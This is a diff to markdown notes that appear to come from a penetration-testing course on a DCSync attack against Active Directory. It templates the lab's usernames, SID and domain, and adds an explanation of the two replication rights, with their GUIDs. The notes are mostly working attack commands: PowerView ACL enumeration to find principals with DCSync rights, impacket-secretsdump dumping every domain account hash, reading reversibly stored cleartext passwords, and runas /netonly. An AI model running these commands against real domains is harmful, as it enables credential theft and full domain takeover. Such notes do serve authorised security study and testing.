@@ -7,20 +7,25 @@
 > Terminal output is omitted; only commands & scripts are captured.
 
 ```powershell
-Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+Get-DomainUser -Identity {{USERNAME}}  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
 ```
 
 ```powershell
-$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
-Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+$sid= "{{SID}}"
+Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 ```
 
-```bash
-impacket-secretsdump -outputfile inlanefreight_hashes -just-dc {{DOMAIN_NB}}/adunn@{{DC_IP}} 
-```
+> **What this checks:** DCSync needs **both** replication extended rights on the domain object. If the ACL above lists your `$sid` with both, that principal can DCSync — i.e. dump *any/all* account hashes (Administrator → PtH as DA; krbtgt → Golden Ticket).
+>
+> | Right | GUID |
+> |---|---|
+> | DS-Replication-Get-Changes | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
+> | DS-Replication-Get-Changes-All | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` |
+>
+> `-match 'Replication-Get'` catches both; **one alone isn't enough**. Default holders (Domain Admins, Enterprise Admins, Domain Controllers) are noise — the finding is a **non-default** principal (e.g. a user you compromised via [21](21-acl-abuse-tactics.md)) holding these. BloodHound flags the same thing as a `DCSync` edge to the domain.
 
 ```bash
-ls inlanefreight_hashes*
+impacket-secretsdump -outputfile hashes -just-dc {{DOMAIN_NB}}/{{USERNAME}}@{{DC_IP}} 
 ```
 
 ```powershell
@@ -32,11 +37,11 @@ Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD
 ```
 
 ```bash
-cat inlanefreight_hashes.ntds.cleartext 
+cat hashes.ntds.cleartext 
 ```
 
 ```cmd
-runas /netonly /user:{{DOMAIN_NB}}\adunn powershell
+runas /netonly /user:{{DOMAIN_NB}}\{{USERNAME}} powershell
 ```
 
 ```powershell
